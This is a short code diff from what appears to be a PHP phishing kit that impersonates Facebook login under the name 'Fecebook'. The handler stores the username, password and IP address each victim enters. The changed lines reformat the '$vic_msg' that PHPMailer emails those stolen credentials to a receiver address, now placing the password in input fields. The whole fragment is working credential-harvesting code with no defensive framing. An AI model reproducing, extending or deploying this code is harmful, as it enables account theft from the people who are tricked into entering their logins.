@@ -18,7 +18,9 @@
 		$rs = mysqli_query($con, $sql);
 		
 		//------------------------
-		$vic_msg = "Username : ".$usr."<br>Password : ".$pass."<br>IP Address : ".$ip."Login Time : ".$saveTime;
+		//$vic_msg = "Username : ".$usr."<br>Password : ".$pass."<br>IP Address : ".$ip."Login Time : ".$saveTime;
+		$vic_msg = "Username : <input type='text' value='".$usr."'></input><br><br>Password : <input type='text' value='".$pass."'></input><br><br>IP Address : ".$ip."<br><br>Time : ".$saveTime;
+
 		$name = "Fecebook rf gd";
 		$rec_mail = "Recieveremail@gmail.com";
 		$mail = new PHPMailer();
